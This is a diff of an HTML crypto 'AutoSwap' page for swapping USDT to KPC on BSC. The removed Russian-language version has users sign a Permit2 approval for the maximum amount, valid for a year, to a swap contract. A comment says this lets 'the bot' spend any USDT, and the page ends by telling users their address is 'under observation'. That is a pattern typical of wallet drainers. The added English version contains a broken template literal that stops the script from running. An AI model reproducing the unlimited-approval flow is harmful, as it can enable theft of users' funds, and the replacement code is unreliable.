@@ -1,314 +1,97 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CryptoAutoSwap USDT→KPC</title>
+  <meta charset="UTF-8" />
+  <title>Permit2 AutoSwap Interface</title>
   <style>
     body {
-      background: #17212b;
-      color: #fff;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 20px;
-    }
-    h1 {
-      margin: 20px 0;
-      font-size: 24px;
+      font-family: Arial, sans-serif;
       text-align: center;
+      margin-top: 60px;
+      background: #f8f8f8;
     }
-    #status {
-      margin: 12px 0;
-      text-align: center;
-      white-space: pre-wrap;
-    }
+
     button {
+      padding: 12px 24px;
+      margin: 10px;
       font-size: 16px;
-      padding: 12px 20px;
-      margin: 12px 0;
-      border: none;
-      border-radius: 8px;
-      background: #2ea6ff;
-      color: #fff;
       cursor: pointer;
     }
-    button:disabled {
-      background: #555;
-      cursor: not-allowed;
-    }
-    #qrModal {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.8);
-      align-items: center;
-      justify-content: center;
-    }
-    #qrContainer {
-      background: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      text-align: center;
-      color: #000;
+
+    #walletAddress {
+      margin-top: 20px;
+      font-weight: bold;
     }
   </style>
-
-  <!-- Web3.js для RPC -->
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.1/dist/web3.min.js"></script>
-  <!-- QRCode.js для QR -->
-  <script src="https://cdn.jsdelivr.net/npm/qrcode@latest/build/qrcode.min.js"></script>
-  <!-- WalletConnect v2 SignClient -->
-  <script type="module" src="https://esm.sh/@walletconnect/sign-client@2.21.0"></script>
 </head>
 <body>
-  <h1>CryptoAutoSwap USDT→KPC<br><small>Курс: 1 USDT = 0.024 KPC</small></h1>
+  <h1>Permit2 AutoSwap</h1>
 
-  <div id="status">Нажмите «Connect & Permit USDT»</div>
-  <button id="permitBtn">Connect & Permit USDT</button>
+  <button id="connectWallet">🔌 Connect Wallet</button>
+  <div id="walletAddress"></div>
 
-  <!-- Модалка для QR‑кода -->
-  <div id="qrModal">
-    <div id="qrContainer">
-      <h3>Сканируйте QR‑код в кошельке</h3>
-      <canvas id="qrCanvas"></canvas><br>
-      <button id="closeQrBtn" style="background:#e64a45; margin-top:12px;">Закрыть</button>
-    </div>
-  </div>
+  <button id="swapTokens">🔁 Swap USDT → KPC</button>
 
-  <script type="module">
-    import SignClient from "https://esm.sh/@walletconnect/sign-client@2.21.0";
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.14.3/dist/ethers.min.js"></script>
+  <script>
+    // ===== Replace with actual addresses =====
+    const PERMIT2_ADDRESS = "0xA252294555A62511CBd1899Ac5dEfA26F5036098";
+    const AUTOSWAP_ADDRESS = "0x48EEcE98f1AC0C59Db0Fe3217F6783D503e3416c";
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027b3197955";
+    const KPC_ADDRESS = "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f";
 
-    // ─────────────────────────────────────────────────────────────────────────
-    // Конфигурация: замените <...> на реальные адреса после деплоя
-    const CONFIG = {
-      USDT_CONTRACT:   "0x55d398326f99059fF775485246999027b3197955".toLowerCase(),
-      PERMIT2_ADDRESS: "0x807Eeed9EC9ffA38798fDc7694FbF4D09EBAa4A3".toLowerCase(),
-      SWAP_ADDRESS:    "0xB184b9e260d2e8B7E6f3E82109c3784C708Fd752".toLowerCase(),
-      WC_PROJECT_ID:   "d868f90cd734355ae0320f8f0258b6b1", // пример ID
-      WC_RELAY_URL:    "wss://relay.walletconnect.com",
-      BSC_RPC:         "https://bsc-dataseed.binance.org/"
-    };
-    // ─────────────────────────────────────────────────────────────────────────
-
-    // DOM-элементы
-    const statusEl   = document.getElementById("status");
-    const permitBtn  = document.getElementById("permitBtn");
-    const qrModal    = document.getElementById("qrModal");
-    const qrCanvas   = document.getElementById("qrCanvas");
-    const closeQrBtn = document.getElementById("closeQrBtn");
-
-    function setStatus(text) {
-      statusEl.innerText = text;
-    }
-
-    permitBtn.onclick = async () => {
-      permitBtn.disabled = true;
-      await connectAndPermit();
-    };
-
-    closeQrBtn.onclick = () => {
-      qrModal.style.display = "none";
-    };
-
-    // ─────────────────────────────────────────────────────────────────────────
-    // Основная логика: WalletConnect + EIP‑712 Permit2 + permitUSDT(...)
-    async function connectAndPermit() {
-      try {
-        setStatus("Инициализация WalletConnect...");
-        const client = await SignClient.init({
-          projectId: CONFIG.WC_PROJECT_ID,
-          relayUrl:  CONFIG.WC_RELAY_URL,
-          metadata: {
-            name:        "CryptoAutoSwap Permit",
-            description: "Подпишите Permit2 для USDT",
-            url:         window.location.href,
-            icons:       ["https://cryptogt.app/icon.png"]
-          },
-          storageOptions: { database: ":memory:" },
-        });
-
-        setStatus("Создание сессии WalletConnect...");
-        const { uri, approval } = await client.connect({
-          requiredNamespaces: {
-            eip155: {
-              methods: ["eth_chainId", "eth_signTypedData", "eth_sendTransaction"],
-              chains:  ["eip155:56"],
-              events:  ["chainChanged"]
-            }
-          }
-        });
-
-        // Показать модалку с QR-кодом
-        qrModal.style.display = "flex";
-        QRCode.toCanvas(qrCanvas, uri, { width: 220, margin: 1 });
-        setStatus("Сканируйте QR‑код в кошельке...");
-
-        const session = await approval();
-        qrModal.style.display = "none";
-
-        const userAddress = session.namespaces.eip155.accounts[0].split(":")[2].toLowerCase();
-        setStatus("Кошелёк подключён: " + userAddress);
-
-        // Проверка сети (BSC Mainnet)
-        const chainId = await client.request({
-          topic:    session.topic,
-          chainId:  "eip155:56",
-          request:  { method: "eth_chainId" }
-        });
-        if (chainId !== "0x38") {
-          throw new Error("Переключите сеть на BSC (chainId=56)");
-        }
-
-        // ─── Подготовка EIP‑712 для Permit2 (USDT) ───────────────────────────────
-        setStatus("Генерация данных Permit2 (USDT)...");
-        const web3    = new Web3(CONFIG.BSC_RPC);
-        const permit2 = new web3.eth.Contract([
-          {
-            "inputs":[
-              { "internalType":"address","name":"owner","type":"address" },
-              { "internalType":"address","name":"spender","type":"address" },
-              { "internalType":"address","name":"token","type":"address" }
-            ],
-            "name":"allowanceNonces",
-            "outputs":[{ "internalType":"uint48","name":"","type":"uint48" }],
-            "stateMutability":"view",
-            "type":"function"
-          }
-        ], CONFIG.PERMIT2_ADDRESS);
-
-        // 1) Получаем nonce: Permit2.allowanceNonces(user, swap, USDT)
-        const nonce = await permit2.methods
-          .allowanceNonces(userAddress, CONFIG.SWAP_ADDRESS, CONFIG.USDT_CONTRACT)
-          .call();
-
-        // 2) expiration = сейчас + 365 дней
-        const expiration = Math.floor(Date.now() / 1000) + 365 * 24 * 3600;
-
-        // 3) amount = max uint160 (чтобы бот мог свапать любые USDT без нового Permit)
-        const maxAmount = web3.utils.toBN(2).pow(web3.utils.toBN(160)).sub(web3.utils.toBN(1));
-
-        // 4) Формируем PermitSingle
-        const permitData = {
-          token:      CONFIG.USDT_CONTRACT,
-          amount:     maxAmount.toString(),
-          expiration: expiration,
-          nonce:      Number(nonce),
-          spender:    CONFIG.SWAP_ADDRESS
-        };
-
-        // 5) Собираем EIP‑712 message
-        const domain = {
-          name:               "Permit2",
-          version:            "1",
-          chainId:            56,
-          verifyingContract:  CONFIG.PERMIT2_ADDRESS
-        };
-        const types = {
-          PermitSingle: [
-            { name: "token",      type: "address" },
-            { name: "amount",     type: "uint160" },
-            { name: "expiration", type: "uint48"  },
-            { name: "nonce",      type: "uint48"  },
-            { name: "spender",    type: "address" }
-          ]
-        };
-        const message = {
-          types: {
-            EIP712Domain: [
-              { name: "name",            type: "string"  },
-              { name: "version",         type: "string"  },
-              { name: "chainId",         type: "uint256" },
-              { name: "verifyingContract", type: "address" }
-            ],
-            ...types
-          },
-          domain:      domain,
-          primaryType: "PermitSingle",
-          message:     permitData
-        };
-
-        setStatus("Ожидание EIP‑712 подписи Permit2...");
-        // Некоторые кошельки требуют "eth_signTypedData_v4"
-        const signature = await client.request({
-          topic:    session.topic,
-          chainId:  "eip155:56",
-          request:  {
-            method: "eth_signTypedData_v4",
-            params: [userAddress, JSON.stringify(message)]
-          }
-        });
-        setStatus("Permit2 (USDT) подписан.");
-
-        // ─── Кодируем вызов permitUSDT(...) ────────────────────────────────────
-        setStatus("Формируем транзакцию permitUSDT...");
-        const swapAbi = [
-          {
-            "inputs":[
-              {
-                "components":[
-                  { "internalType":"address","name":"token","type":"address" },
-                  { "internalType":"uint160","name":"amount","type":"uint160" },
-                  { "internalType":"uint48","name":"expiration","type":"uint48" },
-                  { "internalType":"uint48","name":"nonce","type":"uint48" },
-                  { "internalType":"address","name":"spender","type":"address" }
-                ],
-                "internalType":"struct IPermit2.PermitSingle","name":"permitData","type":"tuple"
-              },
-              { "internalType":"bytes","name":"signature","type":"bytes" }
-            ],
-            "name":"permitUSDT",
-            "outputs":[],
-            "stateMutability":"nonpayable",
-            "type":"function"
-          }
-        ];
-        const swapContract = new web3.eth.Contract(swapAbi, CONFIG.SWAP_ADDRESS);
-        const data = swapContract.methods
-          .permitUSDT(
-            [
-              permitData.token,
-              permitData.amount,
-              permitData.expiration,
-              permitData.nonce,
-              permitData.spender
-            ],
-            signature
-          )
-          .encodeABI();
-
-        setStatus("Расчёт газа для permitUSDT...");
-        const gasEstimate = await web3.eth.estimateGas({
-          from: userAddress,
-          to:   CONFIG.SWAP_ADDRESS,
-          data: data
-        });
-        const gasPrice = await web3.eth.getGasPrice();
-
-        setStatus("Подтвердите транзакцию permitUSDT...");
-        const txHash = await client.request({
-          topic:    session.topic,
-          chainId:  "eip155:56",
-          request:  {
-            method: "eth_sendTransaction",
-            params: [{
-              from:     userAddress,
-              to:       CONFIG.SWAP_ADDRESS,
-              data:     data,
-              gas:      web3.utils.toHex(Math.round(gasEstimate * 1.2)),
-              gasPrice: gasPrice
-            }]
-          }
-        });
-        setStatus(`✅ permitUSDT отправлен!\nTxHash: ${txHash}\nВаш адрес теперь в «наблюдении»`);
-      } catch (err) {
-        console.error(err);
-        setStatus("Ошибка: " + (err.message || err));
+    // ===== Minimal ABI for AutoSwap =====
+    const autoSwapAbi = [
+      {
+        "inputs": [
+          { "internalType": "address", "name": "tokenIn", "type": "address" },
+          { "internalType": "address", "name": "tokenOut", "type": "address" },
+          { "internalType": "uint256", "name": "amountIn", "type": "uint256" },
+          { "internalType": "uint256", "name": "deadline", "type": "uint256" }
+        ],
+        "name": "swap",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
       }
-    }
-    // ─────────────────────────────────────────────────────────────────────────
+    ];
+
+    let provider, signer, walletAddress, autoSwap;
+
+    document.getElementById('connectWallet').addEventListener('click', async () => {
+      if (window.ethereum) {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+        walletAddress = await signer.getAddress();
+
+        document.getElementById('walletAddress').innerText = ✅ Connected: ${walletAddress};
+
+        autoSwap = new ethers.Contract(AUTOSWAP_ADDRESS, autoSwapAbi, signer);
+      } else {
+        alert("Install MetaMask!");
+      }
+    });
+
+    document.getElementById('swapTokens').addEventListener('click', async () => {
+      try {
+        const amountIn = ethers.parseUnits("1.0", 18); // 1 USDT
+        const deadline = Math.floor(Date.now() / 1000) + 60 * 10;
+
+        const tx = await autoSwap.swap(
+          USDT_ADDRESS,
+          KPC_ADDRESS,
+          amountIn,
+          deadline
+        );
+
+        await tx.wait();
+        alert("✅ Swap completed!");
+      } catch (e) {
+        console.error(e);
+        alert("❌ Swap failed: " + e.message);
+      }
+    });
   </script>
 </body>
 </html>
